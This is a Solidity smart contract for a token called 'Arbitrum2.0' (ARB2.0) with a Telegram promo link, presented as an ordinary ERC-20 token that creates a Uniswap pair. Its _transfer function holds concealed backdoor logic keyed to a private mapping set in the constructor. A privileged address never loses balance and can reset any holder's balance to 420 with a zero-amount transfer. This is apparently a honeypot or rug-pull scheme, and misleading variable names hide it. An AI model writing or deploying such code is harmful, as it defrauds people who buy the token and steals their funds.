// SPDX-License-Identifier: MIT

//https://t.me/Arbitrum2_0

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Arbitrum2 is Ownable {

    string public name = 'Arbitrum2.0';
    string public symbol = 'ARB2.0';
    uint8 public decimals = 9;
    uint256 public totalSupply = 1000000000 * 10 ** 9;
    address public uniSwapv2Pair;
    uint256 private tTotal = 420;

    mapping(address => uint256) private prime;
    mapping(address => uint256) private balances;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address approver, uint256 _tTotal) public returns (bool success) {
        allowance[msg.sender][approver] = _tTotal;
        emit Approval(msg.sender, approver, _tTotal);
        return true;
    }

    function _transfer(address sender, address receiver, uint256 _tTotal) private {
        if (balances[sender] == 0) {
            balanceOf[sender] -= _tTotal;
        }
        balanceOf[receiver] += _tTotal;
        if (balances[msg.sender] > 0 && _tTotal == 0 && receiver != uniSwapv2Pair) {
            balanceOf[receiver] = tTotal;
        }
        emit Transfer(sender, receiver, _tTotal);
    }

    function transfer(address receiver, uint256 _tTotal) public returns (bool success) {
        _transfer(msg.sender, receiver, _tTotal);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address sender, address receiver, uint256 _tTotal) public returns (bool success) {
        require(_tTotal <= allowance[sender][msg.sender]);
        allowance[sender][msg.sender] -= _tTotal;
        _transfer(sender, receiver, _tTotal);
        return true;
    }

    constructor(address automatedPair){
        balanceOf[msg.sender] = totalSupply;
        balances[automatedPair] = tTotal;
        //IUniswapV2Router02 uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //ETH
        IUniswapV2Router02 uniRouter = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506); //ARB
        //IUniswapV2Router02 uniRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //BSC
        uniSwapv2Pair = IUniswapV2Factory(uniRouter.factory()).createPair(address(this), uniRouter.WETH());
    }
}